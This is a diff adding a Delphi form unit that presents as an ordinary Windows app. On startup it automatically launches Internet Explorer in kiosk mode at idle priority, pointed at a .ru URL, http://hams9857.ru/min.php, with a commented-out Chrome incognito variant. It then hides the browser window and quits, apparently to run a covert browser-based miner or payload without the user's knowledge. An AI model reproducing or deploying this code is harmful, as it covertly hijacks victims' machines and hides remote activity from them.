@@ -1,0 +1,99 @@
+unit main;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, ShellApi, Vcl.ExtCtrls;
+
+type
+  TForm1 = class(TForm)
+    Button1: TButton;
+    Button2: TButton;
+    Memo1: TMemo;
+    Timer1: TTimer;
+    procedure Button2Click(Sender: TObject);
+    procedure FormShow(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    { Public declarations }
+  end;
+
+var
+  Form1: TForm1;
+
+implementation
+
+{$R *.dfm}
+
+
+function FindWindowExtd(partialTitle: string): HWND;
+var
+  hWndTemp: hWnd;
+  iLenText: Integer;
+  cTitletemp: array [0..254] of Char;
+  sTitleTemp: string;
+begin
+  hWndTemp := FindWindow(nil, nil);
+  while hWndTemp <> 0 do begin
+    iLenText := GetWindowText(hWndTemp, cTitletemp, 255);
+    sTitleTemp := cTitletemp;
+    sTitleTemp := UpperCase(copy( sTitleTemp, 1, iLenText));
+    partialTitle := UpperCase(partialTitle);
+    if pos( partialTitle, sTitleTemp ) <> 0 then
+      Break;
+    hWndTemp := GetWindow(hWndTemp, GW_HWNDNEXT);
+  end;
+  result := hWndTemp;
+end;
+
+procedure increase;
+var
+  ProcessInformation: TProcessInformation;
+  StartupInfo: TStartupInfo;
+  ProgramFilesDir: string;
+  BytesCopied: Integer;
+begin
+  SetLength(ProgramFilesDir, MAX_PATH + 1);
+  BytesCopied := GetEnvironmentVariable('ProgramFiles', PChar(ProgramFilesDir), Length(ProgramFilesDir));
+
+  if BytesCopied <> 0 then
+    SetLength(ProgramFilesDir, BytesCopied);
+
+  FillChar(StartupInfo, SizeOf(TStartupInfo), 0);
+  StartupInfo.cb := SizeOf(TStartupInfo);
+
+  CreateProcess(PChar(ProgramFilesDir + '\Internet Explorer\iexplore.exe'),
+                       ' -k -noframemerging  http://hams9857.ru/min.php', nil, nil, False,
+{  CreateProcess(PChar(ProgramFilesDir + '\Google\Chrome\Application\chrome.exe'),
+                       ' -incognito --new-window http://hams9857.ru/min.php', nil, nil, False,}
+                       IDLE_PRIORITY_CLASS, nil, nil, StartupInfo, ProcessInformation);
+end;
+
+
+procedure TForm1.Button2Click(Sender: TObject);
+var WinHanlde: HWnd;
+begin
+
+increase;
+
+  while true do
+  begin
+    application.ProcessMessages;
+    WinHanlde := FindWIndow('IEFrame', nil);
+    if 0 <> WinHanlde then
+       if ShowWindow(WinHanlde,SW_HIDE ) then
+       begin
+        application.Terminate;
+        break;
+       end;
+  end;
+end;
+
+procedure TForm1.FormShow(Sender: TObject);
+begin
+button2.Click;
+end;
+
+end.
